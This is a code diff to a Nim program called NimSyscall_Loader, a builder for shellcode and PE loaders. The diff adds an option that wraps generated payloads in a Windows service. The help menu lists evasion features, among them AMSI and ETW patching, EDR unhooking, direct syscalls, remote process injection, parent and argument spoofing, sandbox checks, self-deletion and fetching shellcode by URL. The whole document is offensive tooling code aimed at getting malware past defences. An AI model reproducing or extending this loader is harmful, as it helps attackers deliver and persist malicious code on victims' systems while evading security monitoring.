@@ -64,7 +64,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.8
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --service]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -95,6 +95,7 @@ Options:
     --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation
     --pslyrics    Add Lyrics as comments to avoid some more detections
   --sourceonly    Dont compile but just create the source code and compile command
+  --service    Create a Service binary
 
 [Payload retrieval options]
 
@@ -209,7 +210,8 @@ var
     cpl: bool = false
     replaceNimMain: bool = false
     big: bool
-    sourceonly: bool = false
+    sourceonly: bool = false#
+    service: bool = false
     remoteprocesses : seq[string]
     targetdomain : string = ""
     processname: string = ""
@@ -302,7 +304,6 @@ if args["--pslyrics"]:
 
 if args["--sourceonly"]:
     sourceonly = true
-
 
 if args["--arguments"]:
   let argsForPE = args["--arguments"]
@@ -571,6 +572,10 @@ if args["--wow64"]:
 
 if args["--verbose"]:
   verbose = true
+
+if args["--service"]:
+    service = true
+    verbose = false
 
 if args["--noDInvoke"]:
   noDInvoke = true
@@ -946,10 +951,12 @@ let LoadAssemblyStubArgs = """
     discard calcHard()
 
 when not defined(proxy):
-    discard main(nil)
+    when not defined(service):
+        discard main(nil)
 
 when defined(defaultMain):
-    discard main(nil)
+    when not defined(service):
+        discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
@@ -959,10 +966,12 @@ let LoadAssemblyStubNoArgs = """
     assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
 
 when not defined(proxy):
-    discard main(nil)
+    when not defined(service):
+        discard main(nil)
 
 when defined(defaultMain):
-    discard main(nil)
+    when not defined(service):
+        discard main(nil)
 """
 
 
@@ -999,6 +1008,97 @@ let ShellcodeFromFileStub * = fmt"""
         except:
             when defined(verbose):
                 echo obf("[-] Failed to open file: ") & f
+
+"""
+
+let ServiceStub * = """
+
+#
+#
+#               nimWindowsService
+#        (c) Copyright 2018 David Krause
+#
+#    See the file "LICENSE.txt", included in this
+#    distribution, for details about the copyright.
+#
+## the service code
+## a windows service needs to register its main function in the Service control manager
+## and also report its status!
+
+# https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/nf-winsvc-controlservice
+
+type ServiceMain = proc(gSvcStatus: SERVICE_STATUS)
+
+var SERVICE_NAME =  "SERVICE_NAME2_BAA".LPTSTR
+var gSvcStatusHandle: SERVICE_STATUS_HANDLE
+var gSvcStatus: SERVICE_STATUS 
+
+proc reportSvcStatus*(dwCurrentState, dwWin32ExitCode, dwWaitHint: DWORD) =
+    var dwCheckPoint: DWORD = 1 # TODO what is this? 
+    gSvcStatus.dwCurrentState = dwCurrentState
+    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode
+    gSvcStatus.dwWaitHint = dwWaitHint
+    if dwCurrentState == SERVICE_START_PENDING:
+        gSvcStatus.dwControlsAccepted = 0
+    else:
+        gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP
+
+    if dwCurrentState == SERVICE_RUNNING or dwCurrentState == SERVICE_STOPPED:
+        gSvcStatus.dwCheckPoint = 0
+    else:
+        gSvcStatus.dwCheckPoint = dwCheckPoint
+        dwCheckPoint.inc()
+    
+    # Report the status of the service to the SCM.
+    echo "SetServiceStatus: " & $SetServiceStatus(gSvcStatusHandle, addr gSvcStatus)
+
+proc svcCtrlHandler(dwCtrl: DWORD) {.stdcall.} =
+    ## Handle the requested control code. 
+    case dwCtrl
+    of SERVICE_CONTROL_STOP:
+        # Signal the service to stop 
+        # TODO we must stop OUR code somehow!
+        reportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 10_000) # we think we can stop the service in 10 seconds
+    of SERVICE_CONTROL_INTERROGATE:
+        discard
+    else:
+        discard
+
+template wrapServiceMain*(mainProc: ServiceMain): LPSERVICE_MAIN_FUNCTION = 
+    ## wraps a nim proc in a LPSERVICE_MAIN_FUNCTION
+    proc serviceMainFunction(dwArgc: DWORD, lpszArgv: ptr LPTSTR) {.stdcall.} =
+        gSvcStatusHandle = RegisterServiceCtrlHandler(
+            SERVICE_NAME,
+            svcCtrlHandler
+        )
+        gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS
+        gSvcStatus.dwServiceSpecificExitCode = 0
+        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)   
+        mainProc(gSvcStatus) # call the wrapped proc
+        reportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0) # we have to report back when we stopped!
+    serviceMainFunction
+
+
+when isMainModule:
+    import times, os
+    proc serviceMain(gSvcStatus: SERVICE_STATUS) =
+        ## a service main
+        ## use gScvStatus to check if we should stop periodically!
+        discard main(nil)
+        while gSvcStatus.dwCurrentState == SERVICE_RUNNING:
+            reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
+        # reportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0) # we have to report back when we stopped!
+
+    var wrapped = wrapServiceMain(serviceMain)
+    var dispatchTable = [
+        # SERVICE_TABLE_ENTRY(lpServiceName: SERVICE_NAME, lpServiceProc: SvcMain),
+        SERVICE_TABLE_ENTRY(lpServiceName: SERVICE_NAME, lpServiceProc: wrapped),
+        SERVICE_TABLE_ENTRY(lpServiceName: nil, lpServiceProc: nil) # last entry must be nil
+    ]
+
+    echo StartServiceCtrlDispatcher( (addr dispatchTable[0]).LPSERVICE_TABLE_ENTRY)
+    #WaitForSingleObject(-1,-1)
+
 
 """
 
@@ -2068,6 +2168,9 @@ if(dll_out or cpl):
         stub.add(DllCustomExportStub)
         stub = stub.replace("FUNC_EXPORT", f)
 
+if(service):
+    stub.add(ServiceStub)
+
 if (debugMode):
     stub = stub.replace("import strenc", "")
     stub = stub.replace("when not defined(proxy):", "")
@@ -2143,6 +2246,9 @@ elif system.hostOS == "linux":
 if (dllProxy):
     basicCompileFlags.add("--mm:orc --threads:on ")
     basicCompileFlags.add("-d:proxy ")
+
+if(service):
+    basicCompileFlags.add("-d:service ")
 
 if(dllProxy):
     when system.hostOS == "windows":
